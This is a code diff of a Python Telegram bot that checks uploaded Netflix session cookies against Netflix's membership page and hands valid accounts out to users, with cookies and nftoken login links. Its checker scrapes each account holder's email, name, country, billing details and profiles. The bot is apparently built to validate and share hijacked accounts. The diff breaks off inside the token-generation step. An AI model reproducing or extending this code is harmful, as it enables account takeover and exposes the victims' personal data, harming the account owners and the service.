+                    chat_id=REPORT_CHANNEL_ID,
+                    text=f"❌ **NOT WORKING ACCOUNT REPORTED!**\n\n{text}",
+                    reply_markup=InlineKeyboardMarkup(keyboard),
+                    parse_mode=ParseMode.MARKDOWN
+                )
+                update_report_channel_post(report_id, sent_message.message_id)
+                return sent_message.message_id
+            except Exception:
+                return None
+                
+    except Exception:
+        return None
+
+# ============================================================
+# CONFIRM WORKING CALLBACK - CHANNEL BUTTON
+# ============================================================
+
+async def confirm_working_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Admin confirms account is working from channel post."""
+    try:
+        query = update.callback_query
+        await query.answer()
+        
+        data = query.data
+        parts = data.split("_")
+        
+        if len(parts) < 4:
+            return
+        
+        action = parts[1]
+        report_id = int(parts[2])
+        account_id = int(parts[3])
+        
+        user_id = query.from_user.id
+        
+        if user_id not in ADMIN_IDS:
+            await query.answer("⛔ Not authorized!", show_alert=True)
+            return
+        
+        if action == "working":
+            # Confirm working
+            confirm_account_working(account_id, report_id, user_id)
+            
+            # Update channel message
+            await query.edit_message_caption(
+                caption=query.message.caption + "\n\n✅ **CONFIRMED WORKING by Admin!**",
+                parse_mode=ParseMode.MARKDOWN
+            )
+            
+            await query.answer("✅ Account confirmed working!")
+            
+            # Notify user
+            cur = db.execute('SELECT user_id FROM reports WHERE id = ?', (report_id,))
+            row = cur.fetchone()
+            if row:
+                try:
+                    await context.bot.send_message(
+                        row[0],
+                        f"✅ **Your report #{report_id} has been CONFIRMED!**\n\n"
+                        f"🎉 Account is working. Thank you for reporting!\n\n"
+                        f"👨‍💻 **Developer:** @Senzo268",
+                        parse_mode=ParseMode.MARKDOWN
+                    )
+                except Exception:
+                    pass
+                    
+        elif action == "notworking":
+            # Mark as not working
+            db.execute('UPDATE accounts SET is_working = 0, status = "broken" WHERE id = ?', (account_id,))
+            db.execute('UPDATE reports SET status = "accepted", reviewed_at = CURRENT_TIMESTAMP, admin_id = ? WHERE id = ?', (user_id, report_id))
+            db.commit()
+            
+            await query.edit_message_caption(
+                caption=query.message.caption + "\n\n❌ **MARKED AS NOT WORKING by Admin!**",
+                parse_mode=ParseMode.MARKDOWN
+            )
+            
+            await query.answer("❌ Account marked as not working!")
+            
+            # Notify user
+            cur = db.execute('SELECT user_id FROM reports WHERE id = ?', (report_id,))
+            row = cur.fetchone()
+            if row:
+                try:
+                    await context.bot.send_message(
+                        row[0],
+                        f"❌ **Your report #{report_id} has been CONFIRMED!**\n\n"
+                        f"⚠️ Account marked as NOT working.\n\n"
+                        f"👨‍💻 **Developer:** @Senzo268",
+                        parse_mode=ParseMode.MARKDOWN
+                    )
+                except Exception:
+                    pass
+                    
+    except Exception:
+        pass
+
+# ============================================================
+# TELEGRAM BOT HANDLERS
+# ============================================================
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    try:
+        user = update.effective_user
+        user_id = user.id
+        user_data = get_user(user_id)
+        
+        if safe_bool(user_data.get("pending_report")):
+            await update.message.reply_text(
+                f"⚠️ **You have a pending report!**\n\n"
+                f"Please upload a screenshot proof.\n\n"
+                f"👨‍💻 **Developer:** @Senzo268",
+                parse_mode=ParseMode.MARKDOWN
+            )
+            return
+        
+        create_user(user_id, safe_str(user.username), safe_str(user.first_name))
+        
+        if safe_bool(user_data.get("is_banned")):
+            await update.message.reply_text("🚫 You are banned.")
+            return
+        
+        stats = get_total_accounts()
+        plan_display = ""
+        for plan, count in stats.get('plans', {}).items():
+            emoji = {"PREMIUM": "👑", "STANDARD": "⭐", "BASIC": "🎯", "MOBILE": "📱", "FREE": "🆓"}.get(plan, "📦")
+            plan_display += f"│ {emoji} {plan}: **{count}**\n"
+        if not plan_display:
+            plan_display = "│ No accounts available\n"
+        
+        assigned = get_assigned_account(user_id)
+        keyboard = [
+            [InlineKeyboardButton("🎯 Get Account", callback_data="get_account")],
+        ]
+        if assigned:
+            keyboard.append([
+                InlineKeyboardButton("✅ Working", callback_data="working"),
+                InlineKeyboardButton("❌ Not Working", callback_data="notworking"),
+            ])
+        keyboard.append([
+            InlineKeyboardButton("📞 Contact Admin", callback_data="contact"),
+            InlineKeyboardButton("📊 My Status", callback_data="my_status"),
+        ])
+        if safe_bool(user_data.get("is_admin")) or user_id in ADMIN_IDS:
+            keyboard.append([InlineKeyboardButton("⚙️ Admin Panel", callback_data="admin_panel")])
+        
+        text = f"""
+🌟 **WELCOME TO SENZO NETFLIX BOT** 🌟
+━━━━━━━━━━━━━━━━━━━━━
+👋 Hello **{safe_str(user.first_name)}**!
+━━━━━━━━━━━━━━━━━━━━━
+📊 **ACCOUNT STATUS**
+┌─────────────────────
+│ 📦 Total Available: **{safe_int(stats.get('total'))}**
+{plan_display}└─────────────────────
+⚙️ **YOUR STATS**
+┌─────────────────────
+│ ✅ Working Reports: **{safe_int(user_data.get('working_reports'))}**
+│ ❌ Not Working: **{safe_int(user_data.get('notworking_reports'))}**
+│ 📦 Accounts Used: **{safe_int(user_data.get('accounts_used'))}/{MAX_ACCOUNTS_PER_USER}**
+└─────────────────────
+⏳ Cooldown: **{WORKING_COOLDOWN_MINUTES} min**
+━━━━━━━━━━━━━━━━━━━━━
+🔽 **SELECT AN OPTION BELOW**
+👨‍💻 **Developer:** @Senzo268
+"""
+        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)
+    except Exception:
+        pass
+
+async def get_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    try:
+        query = update.callback_query
+        await query.answer()
+        user_id = query.from_user.id
+        user_data = get_user(user_id)
+        
+        if safe_bool(user_data.get("is_banned")):
+            await query.edit_message_text("🚫 You are banned.")
+            return
+        
+        can_get, msg = can_get_account(user_id)
+        if not can_get:
+            await query.edit_message_text(msg)
+            return
+        
+        account = assign_account(user_id)
+        if not account:
+            await query.edit_message_text("❌ No accounts available.")
+            return
+        
+        cookie_full = safe_str(account.get('cookies', 'No cookies available'))
+        if len(cookie_full) > 3900:
+            cookie_display = cookie_full[:3900] + "\n\n... (cookie truncated)"
+        else:
+            cookie_display = cookie_full
+        
+        text = f"""
+🎉 **ACCOUNT ASSIGNED!**
+━━━━━━━━━━━━━━━━━━━━━
+📧 **Email:** `{safe_str(account.get('email'))}`
+👤 **Name:** {safe_str(account.get('account_name'))}
+📱 **Phone:** {safe_str(account.get('phone'), 'Not provided')}
+🌍 **Country:** {safe_str(account.get('country'))}
+📦 **Plan:** {safe_str(account.get('plan'))}
+🛡️ **Status:** {safe_str(account.get('membership_status'), 'Unknown')}
+📺 **Streams:** {safe_int(account.get('streams'))}
+🎞️ **Quality:** {safe_str(account.get('quality'))}
+💰 **Price:** {safe_str(account.get('price'), 'N/A')}
+🗓️ **Billing:** {safe_str(account.get('billing_date'))}
+👥 **Extra Member:** {'✅ Yes' if safe_bool(account.get('extra_member')) else '❌ No'}
+🎭 **Profiles:** {safe_str(account.get('profiles'), 'None')}
+🆔 **GUID:** `{safe_str(account.get('user_guid'))}`
+━━━━━━━━━━━━━━━━━━━━━
+🍪 **Cookie:**
+`{cookie_display}`
+━━━━━━━━━━━━━━━━━━━━━
+📝 **INSTRUCTIONS:**
+1️⃣ Click a login link below
+2️⃣ Test the account
+3️⃣ Report Working or Not Working
+"""
+        keyboard = []
+        token = safe_str(account.get('nftoken'))
+        
+        if token and len(token) > 10:
+            keyboard.append([
+                InlineKeyboardButton("📱 Phone Login", url=f"https://netflix.com/unsupported?nftoken={token}"),
+                InlineKeyboardButton("🖥️ PC Login", url=f"https://netflix.com/login?nftoken={token}")
+            ])
+            keyboard.append([
+                InlineKeyboardButton("📺 TV Login", url=f"https://netflix.com/tv8?nftoken={token}")
+            ])
+            if safe_str(account.get('nftoken_expiry')):
+                text += f"\n⏳ NFToken expires: `{safe_str(account.get('nftoken_expiry'))}`"
+        else:
+            keyboard.append([
+                InlineKeyboardButton("📱 Phone Login", url="https://netflix.com/unsupported"),
+                InlineKeyboardButton("🖥️ PC Login", url="https://netflix.com/login")
+            ])
+            keyboard.append([
+                InlineKeyboardButton("📺 TV Login", url="https://netflix.com/tv8")
+            ])
+            text += "\n\n💡 Use cookie with cookie editor extension."
         
         text += "\n\n✅ **After testing, report below:**"
         keyboard.append([
@@ -834,39 +1175,28 @@ async def get_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
             InlineKeyboardButton("❌ Not Working", callback_data=f"report_notworking_{account['id']}")
         ])
         keyboard.append([InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")])
-        
         text += "\n\n👨‍💻 **Developer:** @Senzo268"
         
-        await query.edit_message_text(
-            text,
-            reply_markup=InlineKeyboardMarkup(keyboard),
-            parse_mode=ParseMode.MARKDOWN,
-        )
-        
+        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)
     except Exception:
         pass
-
-# ============================================================
-# WORKING / NOT WORKING
-# ============================================================
 
 async def working_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         query = update.callback_query
         await query.answer()
         user_id = query.from_user.id
+        user_data = get_user(user_id)
         
-        user_data = get_user_safe(user_id)
         if safe_bool(user_data.get("pending_report")):
-            await safe_send_message(user_id, "⚠️ You have a pending report! Upload screenshot first.", context=context)
+            await query.edit_message_text("⚠️ You have a pending report! Upload screenshot first.")
             return
         
-        assigned = get_assigned_account_safe(user_id)
+        assigned = get_assigned_account(user_id)
         if not assigned:
-            await safe_send_message(user_id, "⚠️ No active account! Click 'Get Account' first.", context=context)
+            await query.edit_message_text("⚠️ No active account! Get Account first.")
             return
         
-        # Set pending report
         try:
             db.execute('''
                 UPDATE users 
@@ -879,10 +1209,10 @@ async def working_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         await query.edit_message_text(
             "✅ **Report: WORKING**\n\n"
-            "📸 **Please upload a screenshot proof** for this report.\n\n"
-            "⚠️ **You must upload a screenshot before you can do anything else!**\n\n"
-            "Send a screenshot image now.\n\n👨‍💻 **Developer:** @Senzo268",
-            parse_mode=ParseMode.MARKDOWN,
+            "📸 **Please upload a screenshot proof.**\n\n"
+            "⚠️ Your report will be sent to channel for verification.\n\n"
+            "👨‍💻 **Developer:** @Senzo268",
+            parse_mode=ParseMode.MARKDOWN
         )
     except Exception:
         pass
@@ -892,15 +1222,15 @@ async def notworking_callback(update: Update, context: ContextTypes.DEFAULT_TYPE
         query = update.callback_query
         await query.answer()
         user_id = query.from_user.id
+        user_data = get_user(user_id)
         
-        user_data = get_user_safe(user_id)
         if safe_bool(user_data.get("pending_report")):
-            await safe_send_message(user_id, "⚠️ You have a pending report! Upload screenshot first.", context=context)
+            await query.edit_message_text("⚠️ You have a pending report! Upload screenshot first.")
             return
         
-        assigned = get_assigned_account_safe(user_id)
+        assigned = get_assigned_account(user_id)
         if not assigned:
-            await safe_send_message(user_id, "⚠️ No active account! Click 'Get Account' first.", context=context)
+            await query.edit_message_text("⚠️ No active account! Get Account first.")
             return
         
         try:
@@ -915,30 +1245,26 @@ async def notworking_callback(update: Update, context: ContextTypes.DEFAULT_TYPE
         
         await query.edit_message_text(
             "❌ **Report: NOT WORKING**\n\n"
-            "📸 **Please upload a screenshot proof** for this report.\n\n"
-            "⚠️ **You must upload a screenshot before you can do anything else!**\n\n"
-            "Send a screenshot image now.\n\n👨‍💻 **Developer:** @Senzo268",
-            parse_mode=ParseMode.MARKDOWN,
+            "📸 **Please upload a screenshot proof.**\n\n"
+            "⚠️ Your report will be sent to channel.\n\n"
+            "👨‍💻 **Developer:** @Senzo268",
+            parse_mode=ParseMode.MARKDOWN
         )
     except Exception:
         pass
 
-# ============================================================
-# HANDLE SCREENSHOT
-# ============================================================
-
 async def handle_screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         user_id = update.effective_user.id
-        user_data = get_user_safe(user_id)
+        user_data = get_user(user_id)
         
         if not safe_bool(user_data.get("pending_report")):
-            await safe_send_message(user_id, "❌ You don't have any pending report.\n\nUse the menu buttons to report an account first.", context=context)
+            await update.message.reply_text("❌ No pending report.")
             return
         
         photo = update.message.photo
         if not photo:
-            await safe_send_message(user_id, "❌ Please upload an **image/screenshot**.", context=context)
+            await update.message.reply_text("❌ Please upload an image.")
             return
         
         account_id = safe_int(user_data.get("pending_report_account_id"))
@@ -952,85 +1278,79 @@ async def handle_screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
             ''', (user_id, account_id, report_type, file_id))
             report_id = cur.lastrowid
             
+            # Update user stats
             if report_type == "working":
                 db.execute('UPDATE users SET working_reports = working_reports + 1 WHERE user_id = ?', (user_id,))
-                db.execute('UPDATE accounts SET is_working = 1, status = "available", last_checked = CURRENT_TIMESTAMP WHERE id = ?', (account_id,))
             else:
                 db.execute('UPDATE users SET notworking_reports = notworking_reports + 1 WHERE user_id = ?', (user_id,))
-                db.execute('UPDATE accounts SET is_working = 0, status = "broken", last_checked = CURRENT_TIMESTAMP WHERE id = ?', (account_id,))
             
+            # Clear pending report
             db.execute('''
                 UPDATE users 
                 SET pending_report = 0, pending_report_account_id = NULL, pending_report_type = NULL
                 WHERE user_id = ?
             ''', (user_id,))
-            
-            db.execute('UPDATE accounts SET assigned_to = NULL, assigned_at = NULL, status = "available" WHERE id = ?', (account_id,))
             db.commit()
+            
         except Exception:
-            pass
+            await update.message.reply_text("❌ Error saving report.")
+            return
         
-        await safe_send_message(user_id,
+        await update.message.reply_text(
             f"✅ **Report submitted!**\n\n"
             f"Report ID: #{report_id}\n"
             f"Type: {report_type.upper()}\n\n"
-            f"Admin will review your report shortly.\n"
-            f"You can now use the bot again.\n\n"
+            f"Your report is being sent to channel for verification.\n"
             f"👨‍💻 **Developer:** @Senzo268",
-            context=context
+            parse_mode=ParseMode.MARKDOWN
         )
         
-    except Exception:
-        pass
-
-# ============================================================
-# CHECK JOIN
-# ============================================================
-
-async def check_join_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    try:
-        query = update.callback_query
-        await query.answer()
-        user_id = query.from_user.id
-        
-        joined = await check_force_join_safe(user_id, context)
-        if joined:
-            await query.edit_message_text("✅ You've joined all channels! Starting bot...")
-            await start(update, context)
+        # Send to channel based on report type
+        if report_type == "working":
+            await send_working_to_channel(
+                context.bot,
+                report_id,
+                user_id,
+                account_id,
+                file_id
+            )
         else:
-            await query.answer("❌ You haven't joined all channels yet!", show_alert=True)
+            await send_notworking_to_channel(
+                context.bot,
+                report_id,
+                user_id,
+                account_id,
+                file_id
+            )
+        
+        # Release account
+        release_account(account_id)
+        
     except Exception:
+        await update.message.reply_text("❌ Error processing report.")
         pass
-
-# ============================================================
-# MY STATUS
-# ============================================================
 
 async def my_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         query = update.callback_query
         await query.answer()
         user_id = query.from_user.id
-        
-        user = get_user_safe(user_id)
-        account = get_assigned_account_safe(user_id)
+        user = get_user(user_id)
+        account = get_assigned_account(user_id)
         
         text = f"""
 📊 **YOUR STATUS**
-
 ━━━━━━━━━━━━━━━━━━━━━
 👤 **Name:** {safe_str(user.get('first_name'))}
 🆔 **ID:** `{user_id}`
 📅 **Joined:** {safe_str(user.get('joined_at'))}
 ━━━━━━━━━━━━━━━━━━━━━
-
 📈 **STATISTICS**
 ┌─────────────────────
 │ ✅ Working Reports: **{safe_int(user.get('working_reports'))}**
 │ ❌ Not Working: **{safe_int(user.get('notworking_reports'))}**
 │ 📦 Accounts Used: **{safe_int(user.get('accounts_used'))}/{MAX_ACCOUNTS_PER_USER}**
 └─────────────────────
-
 🔑 **CURRENT ACCOUNT:**
 """
         if account:
@@ -1047,37 +1367,24 @@ async def my_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         text += f"\n⏳ **Cooldown:** {WORKING_COOLDOWN_MINUTES} min"
         text += "\n\n👨‍💻 **Developer:** @Senzo268"
-        
         keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_menu")]]
         await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)
-        
     except Exception:
         pass
-
-# ============================================================
-# CONTACT ADMIN
-# ============================================================
 
 async def contact_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         query = update.callback_query
         await query.answer()
-        user_id = query.from_user.id
-        
         await query.edit_message_text(
             "📝 **CONTACT ADMIN**\n\n"
             "Type your message below.\n"
-            "Admin will reply to you as soon as possible.\n\n"
             "👨‍💻 **Developer:** @Senzo268",
-            parse_mode=ParseMode.MARKDOWN,
+            parse_mode=ParseMode.MARKDOWN
         )
         context.user_data["waiting_for_message"] = True
     except Exception:
         pass
-
-# ============================================================
-# BACK TO MENU
-# ============================================================
 
 async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
@@ -1088,7 +1395,7 @@ async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
         pass
 
 # ============================================================
-# ADMIN PANEL - ENHANCED
+# ADMIN PANEL
 # ============================================================
 
 async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1101,11 +1408,10 @@ async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.answer("⛔ Not authorized!", show_alert=True)
             return
         
-        stats = get_total_accounts_safe()
+        stats = get_total_accounts()
         keyboard = [
             [InlineKeyboardButton("📤 Upload Stock", callback_data="admin_upload")],
-            [InlineKeyboardButton("📋 View Reports", callback_data="admin_reports")],
-            [InlineKeyboardButton("📩 View Messages", callback_data="admin_messages")],
+            [InlineKeyboardButton("👁️ View Reports", callback_data="admin_reports")],
             [InlineKeyboardButton("👥 Users List", callback_data="admin_users")],
             [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")],
             [InlineKeyboardButton("⚙️ Manage Channels", callback_data="admin_channels")],
@@ -1113,38 +1419,26 @@ async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton("📈 Dashboard", callback_data="admin_dashboard")],
             [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")],
         ]
-        
         text = f"""
 ⚙️ **ADMIN PANEL**
-
 ━━━━━━━━━━━━━━━━━━━━━
 🖥️ **SYSTEM STATUS**
 ┌─────────────────────
 │ Status: **🟢 ONLINE**
-│ Database: **✅ Connected**
+│ Database: **{'✅ Turso' if db.use_turso else '⚠️ SQLite'}**
 │ Threads: **{MAX_CHECK_THREADS}**
+│ Channel: **{'✅ Connected' if REPORT_CHANNEL_ID else '❌ Not Set'}**
 └─────────────────────
-
 📊 **STATISTICS**
 ┌─────────────────────
 │ 📦 Available: **{safe_int(stats.get('total'))}**
 └─────────────────────
-
 🔽 **ADMIN ACTIONS:**
+👨‍💻 **Developer:** @Senzo268
 """
-        text += "\n\n👨‍💻 **Developer:** @Senzo268"
-        
-        await query.edit_message_text(
-            text,
-            reply_markup=InlineKeyboardMarkup(keyboard),
-            parse_mode=ParseMode.MARKDOWN,
-        )
+        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)
     except Exception:
         pass
-
-# ============================================================
-# ADMIN UPLOAD
-# ============================================================
 
 async def admin_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
@@ -1158,25 +1452,20 @@ async def admin_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         await query.edit_message_text(
             "📤 **UPLOAD COOKIE FILE**\n\n"
-            "Send a **.txt**, **.json**, or **.zip** file containing Netflix cookies.\n\n"
-            "The bot will extract ALL cookies and check them.\n\n"
+            "Send a **.txt**, **.json**, or **.zip** file.\n\n"
             "👨‍💻 **Developer:** @Senzo268",
-            parse_mode=ParseMode.MARKDOWN,
+            parse_mode=ParseMode.MARKDOWN
         )
         context.user_data["waiting_for_upload"] = True
     except Exception:
         pass
-
-# ============================================================
-# HANDLE FILE UPLOAD - SIMPLIFIED & SAFE
-# ============================================================
 
 async def handle_file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         user_id = update.effective_user.id
         
         if user_id not in ADMIN_IDS:
-            await safe_send_message(user_id, "⛔ Not authorized!", context=context)
+            await update.message.reply_text("⛔ Not authorized!")
             return
         
         if not context.user_data.get("waiting_for_upload"):
@@ -1184,44 +1473,41 @@ async def handle_file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE)
         
         document = update.message.document
         if not document:
-            await safe_send_message(user_id, "❌ Please send a file.", context=context)
+            await update.message.reply_text("❌ Please send a file.")
             return
         
         file_name = document.file_name
         if not file_name.lower().endswith(('.txt', '.json', '.zip')):
-            await safe_send_message(user_id, "❌ Please send .txt, .json, or .zip file.", context=context)
+            await update.message.reply_text("❌ Please send .txt, .json, or .zip.")
             return
         
-        await safe_send_message(user_id, f"⏳ Processing **{file_name}**...", context=context)
+        await update.message.reply_text(f"⏳ Processing **{file_name}**...")
         
         file = await context.bot.get_file(document.file_id)
         file_content = await file.download_as_bytearray()
         content = file_content.decode('utf-8', errors='ignore')
         
-        # Extract cookies
-        cookie_pairs = extract_cookie_pairs_safe(content)
-        
+        cookie_pairs = extract_cookie_pairs(content)
         if not cookie_pairs:
-            await safe_send_message(user_id, "❌ No Netflix cookies found in file.", context=context)
+            await update.message.reply_text("❌ No Netflix cookies found.")
             context.user_data["waiting_for_upload"] = False
             return
         
-        total_cookies = len(cookie_pairs)
-        progress_msg = await safe_send_message(user_id, f"🔄 Checking **{total_cookies}** cookies...", context=context)
-        
+        total = len(cookie_pairs)
         valid = 0
-        all_accounts = []
+        accounts = []
+        
+        progress_msg = await update.message.reply_text(f"🔄 Checking {total} cookies...")
         
         for i, (nid, sid) in enumerate(cookie_pairs):
             cookies_dict = {"NetflixId": nid}
             if sid:
                 cookies_dict["SecureNetflixId"] = sid
-            
-            result = check_account_safe(cookies_dict)
+            result = check_account(cookies_dict)
             
             if result.get("valid") and result.get("subscribed"):
-                cookie_text = get_cookie_text_safe(nid, sid)
-                account_data = {
+                cookie_text = get_cookie_text(nid, sid)
+                accounts.append({
                     "email": safe_str(result.get("email")),
                     "country": safe_str(result.get("country")),
                     "plan": safe_str(result.get("plan_label", "Unknown")),
@@ -1243,266 +1529,46 @@ async def handle_file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE)
                     "email_verified": safe_bool(result.get("email_verified")),
                     "profiles": safe_str(result.get("profiles")),
                     "user_guid": safe_str(result.get("user_guid")),
-                }
-                all_accounts.append(account_data)
+                })
                 valid += 1
+            
+            if (i + 1) % 10 == 0 or (i + 1) == total:
+                await progress_msg.edit_text(f"🔄 Checking... {i+1}/{total} | ✅ Valid: {valid}")
         
-        if all_accounts:
-            saved = save_account_batch_safe(all_accounts)
-            await safe_send_message(user_id,
+        if accounts:
+            saved = save_account_batch(accounts)
+            log_stock(user_id, file_name, total, saved)
+            await progress_msg.edit_text(
                 f"✅ **UPLOAD COMPLETE!**\n\n"
-                f"📁 **File:** {file_name}\n"
-                f"🔍 **Total:** {total_cookies}\n"
-                f"✅ **Valid:** {valid}\n"
-                f"💾 **Saved:** {saved}\n\n"
+                f"📁 File: {file_name}\n"
+                f"🔍 Total: {total}\n"
+                f"✅ Valid: {valid}\n"
+                f"💾 Saved: {saved}\n\n"
                 f"👨‍💻 **Developer:** @Senzo268",
-                context=context
+                parse_mode=ParseMode.MARKDOWN
             )
         else:
-            await safe_send_message(user_id,
+            await progress_msg.edit_text(
                 f"❌ **NO VALID ACCOUNTS FOUND!**\n\n"
                 f"📁 File: {file_name}\n"
-                f"🔍 Total: {total_cookies}\n\n"
+                f"🔍 Total: {total}\n\n"
                 f"👨‍💻 **Developer:** @Senzo268",
-                context=context
+                parse_mode=ParseMode.MARKDOWN
             )
         
         context.user_data["waiting_for_upload"] = False
-        
     except Exception:
         context.user_data["waiting_for_upload"] = False
 
-def extract_cookie_pairs_safe(content: str) -> List[Tuple[str, Optional[str]]]:
-    """Safely extract cookie pairs."""
-    pairs = []
-    seen = set()
-    
-    try:
-        # Try JSON
-        data = json.loads(content)
-        if isinstance(data, dict):
-            if "cookies" in data and isinstance(data["cookies"], list):
-                for cookie in data["cookies"]:
-                    if cookie.get("name") == "NetflixId":
-                        nid = safe_str(cookie.get("value"))
-                        if nid and nid not in seen:
-                            sid = None
-                            for c in data["cookies"]:
-                                if c.get("name") == "SecureNetflixId":
-                                    sid = safe_str(c.get("value"))
-                                    break
-                            seen.add(nid)
-                            pairs.append((nid, sid))
-    except Exception:
-        pass
-    
-    if not pairs:
-        # Try regex
-        netflix_pattern = re.compile(r'NetflixId[=:]\s*([^;\s"\']+)', re.IGNORECASE)
-        secure_pattern = re.compile(r'SecureNetflixId[=:]\s*([^;\s"\']+)', re.IGNORECASE)
-        netflix_matches = netflix_pattern.findall(content)
-        secure_matches = secure_pattern.findall(content)
-        for i, nid in enumerate(netflix_matches):
-            nid = nid.strip('"\'')
-            sid = secure_matches[i].strip('"\'') if i < len(secure_matches) else None
-            if nid and nid not in seen:
-                seen.add(nid)
-                pairs.append((nid, sid))
-    
-    return pairs
-
-def get_cookie_text_safe(netflix_id: str, secure_id: Optional[str] = None) -> str:
-    lines = [".netflix.com\tTRUE\t/\tFALSE\t0\tNetflixId\t" + safe_str(netflix_id)]
-    if secure_id:
-        lines.append(".netflix.com\tTRUE\t/\tTRUE\t0\tSecureNetflixId\t" + safe_str(secure_id))
-    return "\n".join(lines)
-
-def check_account_safe(cookies_dict: Dict) -> Dict:
-    """Safely check account - NEVER crashes."""
-    if not cookies_dict or "NetflixId" not in cookies_dict:
-        return {"valid": False, "error": "Missing NetflixId"}
-    
-    try:
-        session = requests.Session()
-        for name, value in cookies_dict.items():
-            session.cookies.set(name, value, domain=".netflix.com")
-        
-        headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-            "Accept-Language": "en-US,en;q=0.9",
-            "Accept-Encoding": "identity",
-        }
-        
-        for attempt in range(MAX_RETRIES):
-            try:
-                response = session.get(
-                    "https://www.netflix.com/account/membership",
-                    headers=headers,
-                    timeout=CHECK_TIMEOUT,
-                    verify=False,
-                    allow_redirects=True
-                )
-                
-                if response.status_code != 200:
-                    if attempt < MAX_RETRIES - 1:
-                        time.sleep(0.5)
-                        continue
-                    return {"valid": False, "error": f"HTTP {response.status_code}"}
-                
-                if "login" in response.url.lower() or "signin" in response.url.lower():
-                    return {"valid": False, "error": "Redirected to login"}
-                
-                text = response.text
-                
-                # Extract basic info
-                email = None
-                for pattern in [r'"emailAddress"\s*:\s*"([^"]+)"', r'"email"\s*:\s*"([^"]+)"']:
-                    match = re.search(pattern, text, re.IGNORECASE)
-                    if match:
-                        email = match.group(1).strip()
-                        break
-                if not email:
-                    match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', text)
-                    if match:
-                        email = match.group(1).strip()
-                
-                name = None
-                for pattern in [r'"accountOwnerName"\s*:\s*"([^"]+)"', r'"name"\s*:\s*"([^"]+)"']:
-                    match = re.search(pattern, text, re.IGNORECASE)
-                    if match:
-                        name = match.group(1).strip()
-                        break
-                
-                country = None
-                for pattern in [r'"countryOfSignup"\s*:\s*"([^"]+)"', r'"currentCountry"\s*:\s*"([^"]+)"']:
-                    match = re.search(pattern, text, re.IGNORECASE)
-                    if match:
-                        country = match.group(1).strip()
-                        break
-                
-                plan = None
-                for pattern in [r'"localizedPlanName"\s*:\s*"([^"]+)"', r'"planName"\s*:\s*"([^"]+)"']:
-                    match = re.search(pattern, text, re.IGNORECASE)
-                    if match:
-                        plan = match.group(1).strip()
-                        break
-                
-                plan_key = "FREE"
-                plan_label = "Free"
-                if plan:
-                    plan_lower = plan.lower()
-                    if any(x in plan_lower for x in ["premium", "高級", "高级"]):
-                        plan_key, plan_label = "PREMIUM", "Premium"
-                    elif any(x in plan_lower for x in ["standard", "标准", "標準"]):
-                        plan_key, plan_label = "STANDARD", "Standard"
-                    elif any(x in plan_lower for x in ["basic", "basico", "基本"]):
-                        plan_key, plan_label = "BASIC", "Basic"
-                    elif any(x in plan_lower for x in ["mobile", "ponsel", "movil"]):
-                        plan_key, plan_label = "MOBILE", "Mobile"
-                
-                streams = None
-                match = re.search(r'"maxStreams"\s*:\s*([0-9]+)', text)
-                if match:
-                    streams = int(match.group(1))
-                
-                price = None
-                for pattern in [r'"formattedPlanPrice"\s*:\s*"([^"]+)"', r'"displayPrice"\s*:\s*"([^"]+)"']:
-                    match = re.search(pattern, text, re.IGNORECASE)
-                    if match:
-                        price = match.group(1).strip()
-                        break
-                
-                billing = None
-                for pattern in [r'"nextBillingDate"\s*:\s*"([^"]+)"']:
-                    match = re.search(pattern, text, re.IGNORECASE)
-                    if match:
-                        billing = match.group(1).strip()
-                        break
-                
-                membership_status = None
-                match = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', text, re.IGNORECASE)
-                if match:
-                    membership_status = match.group(1).strip()
-                
-                profiles = []
-                for match in re.finditer(r'"profiles"[^}]*"name"\s*:\s*"([^"]+)"', text, re.IGNORECASE):
-                    if match.group(1) not in profiles:
-                        profiles.append(match.group(1))
-                profiles_str = ", ".join(profiles) if profiles else None
-                
-                user_guid = None
-                for pattern in [r'"userGuid"\s*:\s*"([^"]+)"', r'"ownerGuid"\s*:\s*"([^"]+)"']:
-                    match = re.search(pattern, text, re.IGNORECASE)
-                    if match:
-                        user_guid = match.group(1).strip()
-                        break
-                
-                is_subscribed = plan_key != "FREE" or (membership_status and "current_member" in membership_status.lower())
-                
-                # Generate NFToken
-                nftoken = None
-                nftoken_expiry = None
